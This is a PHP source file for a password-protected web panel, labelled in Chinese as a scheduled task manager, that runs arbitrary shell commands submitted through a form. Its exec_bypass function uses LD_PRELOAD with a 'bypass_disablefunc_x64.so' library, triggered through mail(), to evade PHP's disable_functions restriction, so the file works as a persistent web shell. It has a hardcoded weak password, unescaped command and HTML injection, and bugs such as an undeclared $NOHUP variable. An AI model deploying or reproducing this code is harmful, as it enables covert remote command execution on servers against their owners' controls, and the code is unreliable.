<?php
// ==============================================
// 配置区域 - 修改以下参数以适应你的环境
// ==============================================
$CONFIG_FILE = __DIR__ . '/tasks.conf';
$PASSWORD = 'admin123'; // 修改为你的管理密码
$LOG_FILE = __DIR__ . '/task_manager.log'; // 日志文件路径
$TASK_DIR = __DIR__ . '/task'; // 任务控制文件目录
$NOHUP='./nohup';//nohup程序
header('Content-Type: text/html; charset=utf-8');
// ==============================================
// 主程序逻辑
// ==============================================
set_time_limit(0);
// 会话启动和认证
session_start();

// 处理登录
if (isset($_POST['login']) && $_POST['password'] === $PASSWORD) {
    $_SESSION['authenticated'] = true;
}

// 处理退出
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// 如果没有认证，显示登录页面
if (!isset($_SESSION['authenticated'])) {
    showLoginForm();
    exit;
}

// 创建任务目录
if (!file_exists($TASK_DIR)) {
    mkdir($TASK_DIR, 0755, true);
}

// 加载任务配置
$tasks = loadTasks();

// 处理任务管理操作
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	header('Location: ' . $_SERVER['PHP_SELF']);
    if (isset($_POST['add_task'])) {
        $interval = (int)$_POST['interval'];
        if ($interval > 240) {
            $_SESSION['error'] = '执行间隔不能超过240秒';
        } 
        else {
            $taskId = rand(1000, 9999);
            $newTask = [
                'id' => $taskId,
                'command' => $_POST['command'],
                'interval' => $interval,
                'enabled' => isset($_POST['enabled']),
                'pid' => 0
            ];
            $tasks[] = $newTask;
            saveTasks($tasks);
            
            if ($newTask['enabled']) {
                startTask($taskId, $newTask['command'], $newTask['interval']);
            }
        }
    } elseif (isset($_POST['toggle_task'])) {
        $taskId = (int)$_POST['task_id'];
        foreach ($tasks as &$task) {
            if ($task['id'] === $taskId) {
                $task['enabled'] = !$task['enabled'];
                if ($task['enabled']) {
                    startTask($taskId, $task['command'], $task['interval']);
                } else {
                    stopTask($taskId,$task['command']);
                }
                break;
            }
        }
        saveTasks($tasks);
    } elseif (isset($_POST['delete_task'])) {
        $taskId = (int)$_POST['task_id'];
        $tasks = array_filter($tasks, function($task) use ($taskId) {
            if ($task['id'] === $taskId) {
                stopTask($taskId,$task['command']);
                return false;
            }
            return true;
        });
        saveTasks($tasks);
    }
    
    exit;
}

// 显示管理界面
showManagementInterface($tasks,$LOG_FILE);

// ==============================================
// 函数定义
// ==============================================

function exec_bypass($cmd) {
	$out_path = "/tmp/output.txt";
    $evil_cmdline = $cmd . " > " . $out_path . " 2>&1";
    putenv("EVIL_CMDLINE=" . $evil_cmdline);
	$so_path="./bypass_disablefunc_x64.so";
    putenv("LD_PRELOAD=" . $so_path);
    mail("", "", "", "");
	$output_content = file_get_contents($out_path);
    unlink($out_path);
	return  $output_content;
}

function showLoginForm() {
    global $PASSWORD;
    $error = isset($_POST['login']) ? '密码错误' : '';
    echo <<<HTML
<!DOCTYPE html>
<html>
<head>
    <title>登录 - 定时任务管理系统</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-box { width: 100%; max-width: 400px; padding: 20px; background: white; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
    </style>
</head>
<body>
    <div class="login-box">
        <h2 class="text-center mb-4">定时任务管理系统</h2>
        <form method="POST">
            <div class="mb-3">
                <label for="password" class="form-label">密码</label>
                <input type="password" name="password" class="form-control" required>
            </div>
            <button type="submit" name="login" class="btn btn-primary w-100">登录</button>
            {$error}
        </form>
    </div>
</body>
</html>
HTML;
}

function loadTasks() {
    global $CONFIG_FILE;
    if (file_exists($CONFIG_FILE)) {
        $content = file_get_contents($CONFIG_FILE);
        return json_decode($content, true) ?: [];
    }
    return [];
}

function saveTasks($tasks) {
    global $CONFIG_FILE;
    file_put_contents($CONFIG_FILE, json_encode($tasks, JSON_PRETTY_PRINT));
}

function startTask($taskId, $command, $interval) {
    global $TASK_DIR, $LOG_FILE;
    
    // 创建任务控制文件
    $taskFile = $TASK_DIR . '/' . $taskId;
    file_put_contents($taskFile, '1');
    
    // 启动a.sh脚本
    $cmd = $NOHUP.' ./a.sh -c "' . $command . '" -i ' . $taskId . ' -t ' . $interval . ' >> ' . "/dev/null" . ' 2>&1 &';
    exec_bypass($cmd);
    
    // 等待进程启动
    $maxAttempts = 5;
    $attempt = 0;
    $pid = 0;
    
    while ($attempt < $maxAttempts) {
        $pid = getTaskPid($taskId);
        if ($pid > 0) {
            break;
        }
        sleep(1);
        $attempt++;
    }
    
    logMessage("启动任务 #{$taskId} (PID: {$pid}): {$command}");
    return $pid;
}

function stopTask($taskId,$command) {
    global $TASK_DIR;
    
    // 更新任务控制文件
    $taskFile = $TASK_DIR . '/' . $taskId;
    if (file_exists($taskFile)) {
        file_put_contents($taskFile, '0');
    }
    
    // 获取并杀死进程
    killOtherprocess($taskId,$command);
    
    // 删除控制文件
    if (file_exists($taskFile)) {
        unlink($taskFile);
    }
    
    return true;
}

function getTaskPid($taskId) {
    $cmd = "ps -ef | grep 'a\.sh -i {$taskId}' | grep -v grep | awk '{print \$2}'";
    $result = exec_bypass($cmd);
    
    if ($result['status'] && !empty($result['output'])) {
        return (int)trim($result['output']);
    }
    return 0;
}
function killOtherprocess($taskId,$command) {
    // 验证taskId必须是数字
    if (!ctype_digit((string)$taskId)) {
        logMessage("错误: 非法的任务ID格式");
        return false;
    }

    // 更精确的PID获取命令
    // $cmd = 'pgrep -f ./b.sh';
    $cmd2 = 'pgrep -f "'.$command.'"';
    // logMessage("(cmd2: {$cmd2})");
    // logMessage("(CMD: {$cmd})");
    // $cmd = "ps -ef | grep 'b\.sh -i {$taskId}' | grep -v grep | awk '{print \$2}'";
    // $result = exec_bypass($cmd);
    $result2 = exec_bypass($cmd2);
    // logMessage("(result: {$result})");
    // logMessage("(result2: {$result2})");

    preg_match_all('/\d+/', $result2, $matches);
    $pids = $matches[0];
    
    // logMessage("(pid:" . json_encode($pids) . ")");


    if (empty($pids)) {
        logMessage("未找到有效的PID");
        return false;
    }

    // 先尝试正常终止
    foreach ($pids as $pid) {
        exec_bypass("kill $pid");
        usleep(100000); // 等待100ms
    }

    // 检查并强制终止残留进程
    $remaining = [];
    foreach ($pids as $pid) {
        if (posix_getpgid($pid) !== false) {
            exec_bypass("kill -9 {$pid}");
            $remaining[] = $pid;
        }
    }

    if (!empty($remaining)) {
        logMessage("强制停止任务 #{$taskId} (PIDs: " . implode(',', $remaining) . ")");
    } else {
        logMessage("正常停止任务 #{$taskId}");
    }

    return true;
}

function logMessage($message) {
    global $LOG_FILE;
    $timestamp = date('Y-m-d H:i:s');
    file_put_contents($LOG_FILE, "[{$timestamp}] {$message}\n", FILE_APPEND);
}

function showManagementInterface($tasks,$LOG_FILE) {
    $error = isset($_SESSION['error']) ? '<div class="alert alert-danger">'.$_SESSION['error'].'</div>' : '';
    unset($_SESSION['error']);
    
    echo <<<HTML
<!DOCTYPE html>
<html>
<head>
    <title>定时任务管理系统</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #f8f9fa; padding: 20px; }
        .container { max-width: 1000px; margin: 0 auto; }
        .task-card { margin-bottom: 20px; transition: all 0.3s; }
        .task-card.disabled { opacity: 0.6; }
        .log-container { max-height: 300px; overflow-y: auto; background: #f1f1f1; padding: 10px; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <!-- 错误显示区域 -->
            <div class="error-container">
                {$error}
            </div>
        <div class="d-flex justify-content-between align-items-center mb-4">
            <h1>定时任务管理系统</h1>
            <a href="?logout=1" class="btn btn-danger">退出</a>
        </div>

        <!-- 添加任务表单 -->
        <div class="card mb-4">
            <div class="card-header">添加新任务</div>
            <div class="card-body">
                <form method="POST">
                    <div class="row">
                        <div class="col-md-6 mb-3">
                            <label class="form-label">命令</label>
                            <input type="text" name="command" class="form-control" placeholder="要执行的命令" required>
                        </div>
                        <div class="col-md-3 mb-3">
                            <label class="form-label">执行间隔(秒)</label>
                            <input type="number" name="interval" class="form-control" min="1" max="240" value="60" required>
                            <div class="form-text text-muted">请输入1-240之间的整数值</div>
                        </div>
                        <div class="col-md-3 mb-3 d-flex align-items-end">
                            <div class="form-check">
                                <input type="checkbox" name="enabled" class="form-check-input" id="enableCheck" checked>
                                <label class="form-check-label" for="enableCheck">启用任务</label>
                            </div>
                        </div>
                    </div>
                    <button type="submit" name="add_task" class="btn btn-primary">添加任务</button>
                </form>
            </div>
        </div>

        <!-- 任务列表 -->
        <h2 class="mb-3">任务列表</h2>
        <div class="row">
HTML;

    foreach ($tasks as $task) {
        $statusClass = $task['enabled'] ? '' : 'disabled';
        $statusText = $task['enabled'] ? '运行中' : '已停止';
        $toggleBtnClass = $task['enabled'] ? 'btn-warning' : 'btn-success';
        $toggleBtnText = $task['enabled'] ? '停止' : '启动';
        
        echo <<<HTML
            <div class="col-md-6">
                <div class="card task-card {$statusClass}">
                    <div class="card-body">
                        <h5 class="card-title">任务ID: {$task['id']}</h5>
                        <p class="card-text"><strong>命令:</strong> <code>{$task['command']}</code></p>
                        <p class="card-text"><strong>执行间隔:</strong> {$task['interval']} 秒</p>
                        <p class="card-text"><strong>状态:</strong> {$statusText}</p>
                        
                        <form method="POST" class="d-inline">
                            <input type="hidden" name="task_id" value="{$task['id']}">
                            <button type="submit" name="toggle_task" class="btn btn-sm {$toggleBtnClass}">{$toggleBtnText}</button>
                        </form>
                        
                        <form method="POST" class="d-inline" onsubmit="return confirm('确定删除此任务?')">
                            <input type="hidden" name="task_id" value="{$task['id']}">
                            <button type="submit" name="delete_task" class="btn btn-sm btn-danger">删除</button>
                        </form>
                    </div>
                </div>
            </div>
HTML;
    }

    echo <<<HTML
        </div>

        <!-- 日志查看 -->
        <h2 class="mt-5 mb-3">系统日志</h2>
        <div class="log-container">
            <pre>
HTML;
    // echo "<pre>";
    // echo "文件路径: " . htmlspecialchars($LOG_FILE) . "\n";
    // echo "文件存在: " . (file_exists($LOG_FILE) ? '是' : '否') . "\n";
    // echo "文件可读: " . (is_readable($LOG_FILE) ? '是' : '否') . "\n";
    // echo "文件大小: " . filesize($LOG_FILE) . " 字节\n";
    // echo "文件类型: " . filetype($LOG_FILE) . "\n";
    // echo "最后修改: " . date('Y-m-d H:i:s', filemtime($LOG_FILE)) . "\n";
    // echo "</pre>";
    if (file_exists($LOG_FILE)) {
        echo htmlspecialchars(file_get_contents($LOG_FILE));
    } else {
        echo "暂无日志";
    }

    echo <<<HTML
            </pre>
        </div>
    </div>
</body>
</html>
HTML;
}
?>